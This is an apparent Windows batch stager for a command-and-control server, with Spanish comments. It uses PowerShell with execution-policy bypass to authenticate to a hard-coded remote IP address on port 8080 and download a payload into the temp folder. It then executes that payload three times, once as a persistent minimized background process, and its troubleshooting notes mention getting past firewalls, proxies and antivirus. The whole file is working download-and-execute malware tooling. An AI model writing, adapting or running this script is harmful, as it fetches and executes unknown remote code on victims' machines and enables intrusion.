@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title C2 Pure PowerShell - No Curl

echo.
echo [INFO] 🔥 C2 POWERSHELL ONLY - SIN CURL/SILENCIO 🔥
echo.

set "BASE=http://82.29.153.101:8080"
set "PAYLOAD=%TEMP%\payload.bat"
set "LOG=%TEMP%\c2_pure.log"

echo [DEBUG] PowerShell only mode ✓

:: =====================================================
:: [1] AUTH + PARSE (1 comando)
:: =====================================================
echo [INFO] [1/3] 🔑 AUTH + PARSE...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$ErrorActionPreference='Stop'; ^
  try { ^
   Write-Host '[DEBUG] AUTH...'; ^
   $auth = iwr '%BASE%/auth/key' -UseBasicParsing -TimeoutSec 10; ^
   $json = $auth.Content | ConvertFrom-Json; ^
   $nonce = $json.nonce; $token = $json.token; ^
   Write-Host ('[DEBUG] NONCE=' + $nonce); ^
   Write-Host ('[DEBUG] TOKEN=' + $token.Substring(0,10) + '...'); ^
   ^
   Write-Host '[DEBUG] DOWNLOAD...'; ^
   $h = @{ 'X-Nonce'=$nonce; 'X-Token'=$token }; ^
   $payload = iwr '%BASE%/payload/encrypted' -Headers $h -UseBasicParsing -TimeoutSec 15; ^
   $payload.Content | Out-File '%PAYLOAD%' UTF8; ^
   Write-Host ('[DEBUG] SIZE=' + $payload.Content.Length + 'bytes'); ^
   exit 0 ^
  } catch { ^
   Write-Error $_.Exception.Message; exit 1 ^
  }"

if %ERRORLEVEL% neq 0 (
    echo [ERROR] POWERSHELL FAIL - Revisa red/firewall
    goto :fail
)

:: =====================================================
:: [2] VALIDATE + PREVIEW
:: =====================================================
if not exist "%PAYLOAD%" (
    echo [ERROR] PAYLOAD NO CREADO
    goto :fail
)

for %%F in ("%PAYLOAD%") do (
    echo [INFO] [2/3] 📁 PAYLOAD ✓ %%~zF bytes
    if %%~zF LSS 1 echo [ERROR] VACÍO && goto :fail
)

echo [DEBUG] CONTENIDO:
echo ========================================
type "%PAYLOAD%"
echo ========================================
echo.

:: =====================================================
:: [3] EJECUCIÓN MÚLTIPLE - REAL
:: =====================================================
echo [INFO] [3/3] 🚀 EJECUTANDO x3...
echo.

echo 🔥 MÉTODO 1: call directo
call "%PAYLOAD%"

echo 🔥 MÉTODO 2: cmd /c (contexto limpio)
cmd /c "%PAYLOAD%"

echo 🔥 MÉTODO 3: background persistente
start /min cmd /c "%PAYLOAD%"

echo.
echo [SUCCESS] 🎉 3 EJECUCIONES COMPLETADAS 🎉
echo [INFO] Payload queda: %PAYLOAD%
echo.

goto :success

:fail
echo [FAIL] ❌ ERROR EN DOWNLOAD/AUTH
echo [TIP] Verifica:
echo  - Firewall Windows
echo  - Proxy corporativo  
echo  - Antivirus bloqueando
echo  - Puerto 8080 abierto
pause
exit /b 1

:success
echo [INFO] Presiona para salir...
pause >nul

:: CLEANUP OPCIONAL
REM del "%PAYLOAD%" 2>nul